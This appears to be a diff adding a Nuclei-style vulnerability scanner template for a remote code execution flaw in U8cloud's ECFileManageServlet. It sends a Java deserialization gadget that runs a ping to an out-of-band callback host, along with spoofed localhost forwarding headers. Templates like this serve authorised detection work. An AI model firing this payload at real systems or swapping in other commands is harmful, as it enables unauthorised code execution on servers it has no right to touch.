@@ -1,0 +1,26 @@
+id: U8cloud-ECFileManageServlet-rce
+
+info:
+  name: U8cloud-ECFileManageServlet-rce
+  author: U8cloud-ECFileManageServlet-rce
+  severity: Critical
+
+
+http:
+  - raw:
+    - |
+      POST /service/ECFileManageServlet HTTP/1.1
+      Host: {{Hostname}}
+      X-Forwarded-For: 127.0.0.10
+      X-Originating-IP: 127.0.0.10
+      X-Remote-Addr: 127.0.0.10
+      X-Remote-IP: 127.0.0.10
+
+      {{generate_java_gadget("commons-collections3.1", "ping {{interactsh-url}}", "raw")}}
+
+
+    matchers:
+      - type: word
+        part: interactsh_protocol 
+        words:
+          - "dns"
